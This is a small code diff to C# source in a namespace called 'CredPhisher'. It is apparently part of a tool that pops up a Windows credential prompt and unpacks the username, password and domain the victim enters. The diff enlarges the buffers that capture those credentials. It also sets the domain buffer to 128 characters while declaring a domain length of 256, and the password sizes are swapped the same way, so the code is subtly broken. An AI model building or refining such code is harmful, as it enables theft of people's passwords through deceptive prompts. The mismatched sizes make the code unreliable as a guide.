@@ -64,13 +64,13 @@ namespace CredPhisher
                 ref save,
                 1);
 
-            var usernameBuf = new StringBuilder(100);
-            var passwordBuf = new StringBuilder(100);
-            var domainBuf = new StringBuilder(100);
+            var usernameBuf = new StringBuilder(256);
+            var passwordBuf = new StringBuilder(256);
+            var domainBuf = new StringBuilder(128);
 
-            int maxUserName = 100;
-            int maxDomain = 100;
-            int maxPassword = 100;
+            int maxUserName = 256;
+            int maxDomain = 256;
+            int maxPassword = 128;
             if (result == 0)
             {
                 if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
